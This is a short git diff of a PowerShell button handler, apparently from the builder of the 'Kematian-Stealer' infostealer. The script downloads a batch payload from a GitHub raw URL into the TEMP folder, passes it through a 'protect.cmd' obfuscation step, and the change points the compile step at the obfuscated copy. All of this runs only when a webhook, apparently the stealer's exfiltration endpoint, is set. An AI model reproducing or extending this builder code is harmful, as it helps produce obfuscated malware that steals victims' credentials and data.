@@ -45,6 +45,7 @@ $button.Add_Click({
     if (-not [string]::IsNullOrWhiteSpace($webhook)) {
         $url = "https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/main.bat"
         $filePath = "$env:TEMP\main.bat"
+        $filePathprotect = "$env:TEMP\maino.bat"
         
         # Download the file
         Invoke-WebRequest -Uri $url -OutFile $filePath
@@ -59,7 +60,7 @@ $button.Add_Click({
         $protectPath = ".\protect.cmd"  # Change this to the correct path
         Start-Process -FilePath $protectPath -ArgumentList $filePath -NoNewWindow -Wait
         # Execute the .bat file
-        Start-Process -FilePath $compliePath -ArgumentList $filePath -NoNewWindow -Wait
+        Start-Process -FilePath $compliePath -ArgumentList $filePathprotect -NoNewWindow -Wait
 
         # Delete the .bat file after execution
         Remove-Item -Path $filePath -Force
